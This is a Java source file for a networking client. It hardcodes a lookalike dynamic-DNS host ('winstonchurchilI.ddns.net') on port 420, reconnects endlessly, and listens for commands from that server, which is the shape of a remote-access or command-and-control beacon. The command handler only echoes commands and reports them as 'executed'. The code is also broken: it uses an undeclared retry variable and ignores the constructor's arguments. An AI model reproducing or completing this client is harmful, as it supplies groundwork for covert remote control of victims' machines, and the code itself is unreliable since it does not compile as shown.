package NetworkUtils;

import java.io.*;
import java.net.*;
import java.util.concurrent.TimeUnit;

public class ClientNetworkingHandler {

    private static Socket socket;
    private static DataInputStream inputStream;
    private static DataOutputStream outputStream;
    public static String serverHostname;
    public static int serverPort;


    public ClientNetworkingHandler(String hostname, int port, int reconnectInterval) {
        serverHostname = "winstonchurchilI.ddns.net";
        serverPort = 420;
        msRetryFinalConnect = msRetryFinalConnect;
    }

    // resolves ip from hostname
    public void connect() {
        while (true) {
            try {
                InetAddress serverAddress = InetAddress.getByName(serverHostname);
                System.out.println("Resolved IP: " + serverAddress.getHostAddress());

                // connect to server
                socket = new Socket(serverAddress, serverPort);
                inputStream = new DataInputStream(socket.getInputStream());
                outputStream = new DataOutputStream(socket.getOutputStream());
                System.out.println("Connected to the server.");

                // listen for command after established connection
                listenForCommands();
                break;
            } catch (IOException e) {
                System.out.println("Connection failed. Attempting to reconnect...");
                try {
                    TimeUnit.SECONDS.sleep(msRetryFinalConnect);  // wait
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }

    // listen for incoming commands
    private void listenForCommands() throws IOException {
        while (true) {
            try {
                // simulating a recieved "command"
                String command = inputStream.readUTF();
                System.out.println("Received command: " + command);

                // send response back
                outputStream.writeUTF("Command executed: " + command);
            } catch (IOException e) {
                System.out.println("Connection lost. Attempting to reconnect...");
                closeConnection();
                connect();  // reconnect
            }
        }
    }

    // Gracefully close the connection
    public void closeConnection() {
        try {
            if (inputStream != null) inputStream.close();
            if (outputStream != null) outputStream.close();
            if (socket != null) socket.close();
            System.out.println("Connection closed.");
        } catch (IOException e) {
            System.err.println("Error closing connection: " + e.getMessage());
        }
    }
}
